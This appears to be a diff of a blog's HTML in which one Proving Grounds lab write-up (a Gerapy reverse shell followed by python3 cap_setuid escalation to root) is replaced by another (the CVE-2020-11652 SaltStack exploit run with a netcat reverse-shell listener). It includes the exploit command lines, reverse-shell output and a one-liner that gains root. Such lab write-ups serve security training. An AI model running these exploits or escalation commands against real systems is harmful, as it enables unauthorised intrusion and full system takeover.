-[{"name": "exploit"}]
-[*] Found project: exploit
-[*] Getting the ID of the project to build the URL
-[*] Found ID of the project:  1
-[*] Setting up a netcat listener
-listening on [any] 443 ...
-[*] Executing reverse shell payload
-[*] Watchout for shell! :)
-connect to [192.168.45.230] from (UNKNOWN) [192.168.211.24] 55734
-bash: cannot set terminal process group (844): Inappropriate ioctl for device
-bash: no job control in this shell
-app@ubuntu:~/gerapy$ 
-</code></pre></div>
-<h2>3. PrivEsc to root</h2>
-<p>I executed linpeash.sh, but there were too many potential risks.</p>
-<p>What I tried:</p>
-<ul>
-<li>sudo -l</li>
-<li>kernel exploit</li>
-<li>suid/sgid binary</li>
-</ul>
-<p>Nothing worked. But at last, I found that python3 (as binary) has following (linux-) capability!:</p>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">Files with capabilities (limited to 50):
-/snap/core20/1891/usr/bin/ping cap_net_raw=ep
-/snap/core20/2318/usr/bin/ping cap_net_raw=ep
-/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
-/usr/bin/mtr-packet cap_net_raw=ep
-/usr/bin/python3.10 cap_setuid=ep !this one</code></pre></div>
-<p>What is capability then?</p>
+<p>Quick google search reveals us what this is.</p>
 <blockquote>
-<p>Capabilities are useful when you want to restrict your own processes after performing privileged operations (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious commands or arguments which are then run as root.</p>
+<p><a href="https://github.com/saltstack/salt/issues/52981" target="_blank" rel="nofollow">https://github.com/saltstack/salt/issues/52981</a></p>
 </blockquote>
-<p>For example, if there is setuid capability bit for a binary allowed, the binary is allowed to change the setuid of it’s process if it is being executed, since cap_setuid=ep is enabled for python3.10!</p>
-<p>It means, we can use import os; os.setuid(0) by executing python from command shell!</p>
-<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">app@ubuntu:~/gerapy$ python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
-&lt; -c 'import os;os.setuid(0);os.system("/bin/bash")'
-whoami
-root
-cat /root/proof.txt
-96809490798d8d9d8779af42f6fb0f24</code></pre></div>
-<p>I got root. That’s pretty much it.</p>
+<ul>
+<li>Port 80</li>
+</ul>
+<p>Nothing special, just a simple website powered by 8000 maybe.</p>
+<h2>3. Initial Foothold / Root</h2>
+<p>So I found only one CVE which could be useful, and somehow port 8000 and 80 is pointing to zmtp salt, which is a strong evidence that we should try this out.</p>
+<p>At least, we found same keyword “salt” from both services.</p>
+<blockquote>
+<p>CVE-2020-11652</p>
+</blockquote>
+<p>So let’s dig deeper!</p>
+<p>I downloaded Following Script:</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~/pg/twiggy/CVE-2020-11652]
+└─$ python3 CVE-2020-11652.py --master 192.168.135.62 --port 4506 -lh 192.168.45.175 -lp 80 --exec-choose master
+/home/hosan/.local/lib/python3.11/site-packages/salt/transport/client.py:28: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
+  warn_until(
+[+] Checking salt-master (192.168.135.62:4506) status... 
+[+] Read root_key... root key: MM+k7kuD8qK7uY/FCqn+L+gPc6ScqcoJBfVShUUA3KGay3i/woG7skNXpMmON4009lLtSZ9DRlk=
+Got response for attempting master shell: {'jid': '20240906074412689156', 'tag': 'salt/run/20240906074412689156'}. Looks promising!
+Got response for attempting master shell: {'jid': '20240906074412729080', 'tag': 'salt/run/20240906074412729080'}. Looks promising!
+</code></pre></div>
+<p>Error popped up, but I still got root shell.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">┌──(hosan㉿kali)-[~]
+└─$ nc -lvnp 80  
+listening on [any] 80 ...
+connect to [192.168.45.175] from (UNKNOWN) [192.168.135.62] 55068
+bash: no job control in this shell
+[root@twiggy root]# </code></pre></div>
 <h2>4. Review</h2>
-<p>Easy enough, fair enough.</p>
-<p>It covered all basic stuffs though (with privesc enumeration)</p>
+<p>There are several things I learned:</p>
+<ol>
+<li>Avoid using msfconsole.</li>
+<li>Try various exploits from github with various options.
+-> For this, you will need to understand roughly what this exploit does</li>
+<li>Don’t get frustrated!</li>
+</ol>
 <h2>5. Source</h2>
 <ul>
 <li>Proving Grounds</li>
 <li>Me!</li>
-</ul></div><style data-emotion="css 1ws88hl">.css-1ws88hl{width:50%;height:30px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;margin:auto;margin-bottom:50px;}@media (max-width: 768px){.css-1ws88hl{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;width:50%;text-align:center;}}</style><div class="css-1ws88hl e19uf7in2"><style data-emotion="css 170jz57">.css-170jz57{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';border:0;outline:0;background-color:white;}</style><button class="css-170jz57 e19uf7in0"><style data-emotion="css 4gq8eu">.css-4gq8eu{z-index:3;}.css-4gq8eu:hover{background-image:linear-gradient(transparent 60%, #7490b5 40%);}</style><a href="https://hosahn.github.io/240901/" class="css-4gq8eu e19uf7in1">PREV POST</a></button><button class="css-170jz57 e19uf7in0"><a href="https://hosahn.github.io/240906/" class="css-4gq8eu e19uf7in1">NEXT POST</a></button></div><style data-emotion="css hx9xpc">@media (max-width: 768px){.css-hx9xpc{padding:0 20px;}}</style><div class="css-hx9xpc e1l3qcvx0"></div><div><style data-emotion="css jtgsqn">.css-jtgsqn{display:grid;place-items:center;margin-top:200px;padding:50px 0;font-size:15px;text-align:center;line-height:1.5;color:white;background-color:black;opacity:0.7;}@media (max-width: 768px){.css-jtgsqn{font-size:13px;}}</style><footer class="css-jtgsqn e1oae0v80">Thanks for visiting my blog! If you are interested in building a CTF Team, please contact me! -Hosan Lee-<br/><a target="_blank" href="https://icons8.com/icon/37287/footman"> © 2022 Hosan Lee, Munich. Footman icon by Icons8</a></footer></div></main></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/240906/";/*]]>*/</script><!-- slice-start id="_gatsby-scripts-1" -->
+</ul></div><style data-emotion="css 1ws88hl">.css-1ws88hl{width:50%;height:30px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;margin:auto;margin-bottom:50px;}@media (max-width: 768px){.css-1ws88hl{-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;width:50%;text-align:center;}}</style><div class="css-1ws88hl e19uf7in2"><style data-emotion="css 170jz57">.css-170jz57{margin-right:10px;z-index:2;color:black;font-size:15px;font-weight:bold;font-family:'EliceDigitalBaeum';border:0;outline:0;background-color:white;}</style><button class="css-170jz57 e19uf7in0"><style data-emotion="css 4gq8eu">.css-4gq8eu{z-index:3;}.css-4gq8eu:hover{background-image:linear-gradient(transparent 60%, #7490b5 40%);}</style><a href="https://hosahn.github.io/240904/" class="css-4gq8eu e19uf7in1">PREV POST</a></button><button class="css-170jz57 e19uf7in0"><a href="https://hosahn.github.io/240906/" class="css-4gq8eu e19uf7in1">NEXT POST</a></button></div><style data-emotion="css hx9xpc">@media (max-width: 768px){.css-hx9xpc{padding:0 20px;}}</style><div class="css-hx9xpc e1l3qcvx0"></div><div><style data-emotion="css jtgsqn">.css-jtgsqn{display:grid;place-items:center;margin-top:200px;padding:50px 0;font-size:15px;text-align:center;line-height:1.5;color:white;background-color:black;opacity:0.7;}@media (max-width: 768px){.css-jtgsqn{font-size:13px;}}</style><footer class="css-jtgsqn e1oae0v80">Thanks for visiting my blog! If you are interested in building a CTF Team, please contact me! -Hosan Lee-<br/><a target="_blank" href="https://icons8.com/icon/37287/footman"> © 2022 Hosan Lee, Munich. Footman icon by Icons8</a></footer></div></main></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/240906/";/*]]>*/</script><!-- slice-start id="_gatsby-scripts-1" -->
           <script
             id="gatsby-chunk-mapping"
           >
